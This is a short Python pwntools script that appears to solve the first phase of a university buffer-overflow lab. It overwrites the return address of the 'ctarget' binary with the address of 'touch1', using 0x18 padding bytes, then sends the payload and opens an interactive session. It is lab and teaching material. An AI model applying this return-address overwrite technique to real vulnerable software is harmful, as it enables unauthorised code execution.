#!/usr/bin/env python3

from pwn import *

proc = process(["ctarget", "-q"])
elf = ELF("ctarget")
cookie = int(open("cookie.txt").read(), 16)
buffer_size = 0x18

exploit = b"\x90" * buffer_size + p64(elf.symbols["touch1"])
open("c1.in", "wb").write(exploit)

proc.sendline(exploit)
proc.interactive()
